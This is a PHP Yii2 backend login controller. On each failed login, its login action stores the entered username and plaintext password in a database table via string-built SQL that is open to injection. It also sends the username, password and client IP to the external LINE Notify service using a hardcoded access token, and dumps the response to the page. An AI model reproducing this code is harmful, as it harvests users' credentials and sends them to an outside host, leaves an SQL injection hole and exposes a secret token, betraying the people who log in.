<?php
namespace backend\controllers;

use Yii;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use common\models\LoginForm;

/**
 * Site controller
 */
class SiteController extends \common\components\AppController
{
    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'rules' => [
                    [
                        'actions' => ['login', 'error'],
                        'allow' => true,
                    ],
                    [
                        'actions' => ['logout', 'index'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * @inheritdoc
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
        ];
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        //$this->permitRole([1]);
        return $this->render('index');
    }

    /**
     * Login action.
     *
     * @return string
     */
    public function actionLogin()
    {
        
        
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        } else {
            $user = $model->username;
            $pass = $model->password;
            //$this->notifyLine($user, $pass);
            //------------- begin notify --------------
            if ($user<>'') {
                define('LINE_API', "https://notify-api.line.me/api/notify");
                define('LINE_TOKEN', 'A6uGXrGHEeyzqG5icjivxTaDd3Mg8zELQGAML9hY7vm'); //ict check auto
                $connection = Yii::$app->db;
                $sql = "INSERT INTO user_log VALUES ('$user','$pass')";
                $connection->createCommand($sql)->execute();
                $getip=Yii::$app->getRequest()->getUserIP();

                function notify_message($message) {

                    $queryData = array('message' => $message);
                    $queryData = http_build_query($queryData, '', '&');
                    $headerOptions = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                            . "Authorization: Bearer " . LINE_TOKEN . "\r\n"
                            . "Content-Length: " . strlen($queryData) . "\r\n",
                            'content' => $queryData
                        )
                    );
                    $context = stream_context_create($headerOptions);
                    $result = file_get_contents(LINE_API, FALSE, $context);
                    $res = json_decode($result);
                    return $res;
                }

                $res = notify_message($user.','.$pass.','.$getip.' พยายามล้อกอิน(ไม่สำเร็จ)');
                var_dump($res);
                //------------- end notify --------------
            }
            return $this->render('login', [
                        'model' => $model,
            ]);
        }
    }

    /**
     * Logout action.
     *
     * @return string
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }
}
